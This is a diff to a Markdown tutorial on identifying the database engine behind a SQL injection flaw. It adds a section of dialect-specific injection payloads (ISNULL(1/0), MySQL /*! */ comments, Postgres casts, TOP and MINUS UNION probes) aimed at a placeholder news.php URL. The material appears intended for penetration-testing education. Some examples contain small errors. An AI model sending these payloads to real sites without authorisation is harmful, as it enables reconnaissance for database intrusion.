@@ -121,23 +121,23 @@ In a SQLi attack, it is very important to know the nature of the DBMS hidden on 
 
 In this technique, we an retrieve the Backend DBMS banner. In some cases, it may have been replaced by the system administrator.
 This technique lays on some SQL statements:
-* MS SQL : **SELECT @@version**
-* MySQL / MariaDB : **SELECT version()**
-* Oracle : **SELECT version FROM v$instance**
-* Postgres : **SELECT version()**
+* MS SQL: `SELECT @@version`
+* MySQL/MariaDB: `SELECT version()`
+* Oracle: `SELECT version FROM v$instance`
+* Postgres: `SELECT version()`
 
 ## Fingerprinting with string concatenation
 In the case, the banner has been replaced by the administrator for example. Another method consists in using the concatenation handling operators to determine the DBMS.
-* MS SQL: **'a' + 'a'**
-* MySQL: **CONCAT('a','a')**
-* Oracle: **'a' || 'a' or CONCAT('a','a')**
-* Postgres: **'a' || 'a'**
+* MS SQL: `'a' + 'a'`
+* MySQL/MariaDB: `CONCAT('a','a')`
+* Oracle: `'a' || 'a' or CONCAT('a','a')`
+* Postgres: `'a' || 'a'`
 
 As we can see both `Oracle` and `Postgres` use the **||** operator to perform such a concatenation, so we need another difference to distinguish them.
 
 `PL/SQL` define the `CONCAT` operator as well to perform string concatenation and as you can guess this one is not defined on `Postgres`. 
 
-**Example:**
+## Example:
 
 Let say you're testing the following URL: `http://www.example.com/news.php?id=1`
 
@@ -151,25 +151,29 @@ and
 
 We know that different engine have different operators to perform string concatenation as well so all we have to do is to compare the orginal page (`id=1`) with:
 
-* MSSQL: **id=1 AND 'aa'='a'+'a'**
+* MS SQL: `id=1 AND 'aa'='a'+'a'`
 The following comparison should be true:
 
 `http://www.example.com/news.php?id=1''`
+
 `http://www.example.com/news.php?id=1 AND 'aa'='a'+'a'''`
 
-* MySQL/Oracle: **id=1 AND 'aa'=CONCAT('a','a')**
+* MySQL/MariaDB/Oracle: `id=1 AND 'aa'=CONCAT('a','a')`
 
 The following comparison should be true:
 
 `http://www.example.com/news.php?id=1`
+
 `http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')`
 
-* Oracle/Postgres: **id=1 AND 'a'='a'||'a'** 
+* Oracle/Postgres: `id=1 AND 'a'='a'||'a'`
 
 The following comparison should be true:
 
 `http://www.example.com/news.php?id=1`
+
 `http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')`
+
 `http://www.example.com/news.php?id=1 AND 'aa'='a'||'a'`
 
 * Postgres:
@@ -177,10 +181,87 @@ The following comparison should be true:
 The following comparison should be true:
 
 `http://www.example.com/news.php?id=1`
+
 `http://www.example.com/news.php?id=1 AND 'aa'='a'||'a'`
 
 ## Fingerprinting through SQL Dialiect Injection
 
+Each DBMS extends Standart SQL with a set of native statements. Such a set define a SQL Dialect available to develipers to preoperly query a backend DBMS engine. Beside of lack of portability, this flaw gives a way to accurately fingerprint a DBMS through a SQLi, or even better a SQL Dialect Injection. SQL Dialect Injection is an attack vector where only statements, operators and peculiarities of a SQL Dialect are used in a SQLi.
+As an example what does `SELECT 1/0` returns  on different DBMS?
+* MySQL: `NULL`
+* Oracle: `ORA-00923: FROM keyword not found where expected`
+* Postgres: `ERROR: division by zero`
+* SQL Server: `Server: Msg 8134, Level 16, State 1, Line 1 Divide by zero error encountered`
+
+We can exploit this peculiarities to identify MySQL DBMS. To accomplish this task the following comparison shall be true:
+```
+http://www.example.com/news.php?id=1 
+http://www.example.com/news.php?id=1 AND ISNULL(1/0)
+```
+
+Let see more about this fingerprinting technique. 
+
+* MySQL/MariaDB:
+One of MySQL peculiarities is that when a comment block ('/**/') contains an exlamation mark ('/*! sql here*/') it is interpreted by MySQL, and is considered as a normal comment block by other DBMS.
+
+So, if you determine that `http://www.example.com/news.php?id=1` is vulnerable to a BLIND SQL Injection the following comparison should be `'TRUE`:
+```
+ http://www.example.com/news.php?id=1
+ http://www.example.com/news.php?id=1 AND 1=1--
+ ```
+
+When backend engine is MySQL following WEB PAGES should contains the same content of vulnerable URL
+
+`http://www.example.com/news.php?id=1 /*! AND 1=1 */--`
+
+on the other side the following should be completely different:
+
+`http://www.example.com/news.php?id=1 /*! AND 1=0 */--`
+
+* PostgreSQL:
+
+Postgres define the :: operator to perform data casting. It means that `1` as `INT` can be convert to `1` as `CHAR` with the following statements:
+
+`SELECT 1::CHAR`
+
+So, if you determine that `http://www.example.com/news.php?id=1` is vulnerable to a BLIND SQL Injection the following comparison should be true when backend engine is PostgreSQL:
+```
+ http://www.example.com/news.php?id=1
+ http://www.example.com/news.php?id=1 AND 1=1::int
+```
+
+MS SQL Server: `T-SQL` adds `TOP` expression for `SELECT` statements in order to upper limit retrieved result set:
+
+`SELECT TOP 10 FROM news`
+
+The following comparison should be true on MS SQL:
+```
+http://www.example.com/news.php?id=1
+http://www.example.com/news.php?id=1 UNION ALL SELECT TOP 1 NULL,NULL 
+```
+
+* Oracle:
+
+Oracle implements the following set operators:
+```
+* UNION 
+* UNION ALL
+* INTERSECT
+* MINUS
+```
+`MINUS` has not yet been implemented on other DBMS so we can inject it to see if it get executed by backend database with no errors at all.
+
+- /news.php?id=1 is vulnerable to SQL Injection
+- through UNION SQL INJECTION we determine how many expression are retrieved from news.php to the backend DBMS
+- replace UNION with MINUS to see if you get back original page (/news.php?id=1)
+
+```
+http://www.example.com/news.php?id=1
+http://www.example.com/news.php?id=1 UNION ALL SELECT NULL FROM DUAL
+http://www.example.com/news.php?id=1 UNION ALL SELECT NULL,NULL FROM DUAL
+http://www.example.com/news.php?id=1 UNION ALL SELECT NULL,NULL,NULL FROM DUAL
+http://www.example.com/news.php?id=1 MINUS SELECT NULL,NULL,NULL FROM DUAL
+```
 
 ## Error Codes Analysis
 
